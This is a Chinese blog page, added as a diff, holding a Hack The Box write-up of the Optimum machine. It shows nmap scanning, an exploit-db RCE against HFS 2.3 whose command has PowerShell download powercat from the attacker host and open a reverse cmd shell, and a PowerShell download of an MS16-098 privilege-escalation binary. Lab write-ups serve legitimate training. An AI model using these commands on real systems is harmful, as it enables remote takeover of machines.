@@ -1,0 +1,267 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>HTB-Optimum - Lw0F</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Lw0F,"> 
+    <meta name="description" content="0x00前言：近期，在玩Hack The Box，遇到一个叫Optimum的靶机，第一次玩相关靶机全程不用msf，所以要记下来(^▽^)
+0x01探索阶段：靶机套路，废话不多说。先用祖传的nmap扫,"> 
+    <meta name="author" content="Lw0F"> 
+    <link rel="alternative" href="atom.xml" title="Lw0F" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Lw0F</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://Lw0f.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">HTB-Optimum</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">HTB-Optimum</h1>
+        <div class="stuff">
+            <span>一月 24, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="0x00前言："><a href="#0x00前言：" class="headerlink" title="0x00前言："></a><strong><em>0x00前言：</em></strong></h2><p><strong><em>近期，在玩Hack The Box，遇到一个叫Optimum的靶机，第一次玩相关靶机全程不用msf，所以要记下来(<em>^▽^</em>)</em></strong></p>
+<h2 id="0x01探索阶段："><a href="#0x01探索阶段：" class="headerlink" title="0x01探索阶段："></a><strong><em>0x01探索阶段：</em></strong></h2><p><strong><em>靶机套路，废话不多说。先用祖传的nmap扫下</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -T4 -F -O -sV --version-light 10.10.10.8 </span><br></pre></td></tr></table></figure>
+
+<p><strong><em>扫出结果如下，发现存在80端口，且为2.3版本HFS。</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-22 21:50 EST</span><br><span class="line">Nmap scan report for 10.10.10.8</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 99 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    HttpFileServer httpd 2.3</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.76 seconds</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>再searchsploit下</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -t hfs</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/1.png" class>
+
+<p><strong><em>查看下详情：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -t hfs -x windows&#x2F;remote&#x2F;39161.py</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/2.png" class>
+
+<p><strong><em>貌似是该py命令执行是基于nc.exe的，不方便的样子，找下其他exp。花了点功夫，找到一个用powershell的</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;49125</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/3.png" class>
+
+
+
+<h2 id="0x02突破阶段："><a href="#0x02突破阶段：" class="headerlink" title="0x02突破阶段："></a><strong><em>0x02突破阶段：</em></strong></h2><p><strong><em>因为该exp远程命令执行、靶机为windows、且网络只与kali相通。所以我的getshell思路是，远程命令利用powershell去下载kali里的powercat，然后反连nc。</em></strong></p>
+<p><strong><em>直接开干！！</em></strong></p>
+<p><strong><em>1、拉个powercat到kali先（<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1%EF%BC%89">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1）</a></em></strong></p>
+<p><strong><em>2、kali开web服务：sudo python -m SimpleHTTPServer 80</em></strong></p>
+<p><strong><em>3、kali  开个nc： nc -lvvp 4444</em></strong></p>
+<p><strong><em>4、构造下远程执行利用语句：</em></strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="number">10.10</span><span class="number">.10</span><span class="number">.8</span> <span class="number">80</span> <span class="string">&quot;c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.33/powercat.ps1&#x27;); powercat -c 10.10.14.33 -p 6666 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/4.png" class>
+
+<p><strong><em>成功getshell！！！！</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/5.png" class>
+
+<p><strong><em>但貌似还只是低权限呢，只能抓个user.txt。。。。</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/6.png" class>
+
+
+
+<h2 id="0x03提权阶段："><a href="#0x03提权阶段：" class="headerlink" title="0x03提权阶段："></a><strong><em>0x03提权阶段：</em></strong></h2><p><strong><em>拿shell后，systeminfo一波后给Windows-Exploit-Suggester分析下</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/7.png" class>
+
+<img src="/2021/01/24/HTB-Optimum/8.png" class>
+
+<p><strong><em>踩了点坑后，将矛头直接对准ms16-098</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/9.png" class>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;41020</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/10.png" class>
+
+<img src="/2021/01/24/HTB-Optimum/11.png" class>
+
+<p><strong><em>下载到kali后，然后在shell上使用powershell传到靶机上去！</em></strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;Invoke-WebRequest -Uri http://10.10.14.33/bfill.exe -OutFile C:\Users\kostas\Desktop\bfill.exe</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/12.png" class>
+
+<p><strong><em>运行后直接变为system权限！</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/13.png" class>
+
+<p><strong><em>有权限后后切换administrator目录找到root.txt</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/14.png" class>
+
+
+
+<h2 id="0x04个人小结："><a href="#0x04个人小结：" class="headerlink" title="0x04个人小结："></a><strong><em>0x04个人小结：</em></strong></h2><p>该靶机的攻略过程看似中规中矩的，但在突破阶段在不使用msf的情况下找合适exp，及提权阶段的漏洞筛选、工具查找、及基于powershell的上传操作其实是坑点，个人在实操过程深有体会~~</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://music.163.com/song/media/outer/url?id=29577193'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://music.163.com/song/media/outer/url?id=28445545'></li>
+                        
+                    
+                        
+                            <li title='2' data-url='http://music.163.com/song/media/outer/url?id=1072983'></li>
+                        
+                    
+                        
+                            <li title='3' data-url='http://music.163.com/song/media/outer/url?id=41630480'></li>
+                        
+                    
+                        
+                            <li title='4' data-url='http://music.163.com/song/media/outer/url?id=29577189'></li>
+                        
+                    
+                        
+                            <li title='5' data-url='http://music.163.com/song/media/outer/url?id=19563212'></li>
+                        
+                    
+                        
+                            <li title='6' data-url='http://music.163.com/song/media/outer/url?id=498661'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">0x00前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E6%8E%A2%E7%B4%A2%E9%98%B6%E6%AE%B5%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">0x01探索阶段：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E7%AA%81%E7%A0%B4%E9%98%B6%E6%AE%B5%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">0x02突破阶段：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E6%8F%90%E6%9D%83%E9%98%B6%E6%AE%B5%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">0x03提权阶段：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%E4%B8%AA%E4%BA%BA%E5%B0%8F%E7%BB%93%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">0x04个人小结：</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
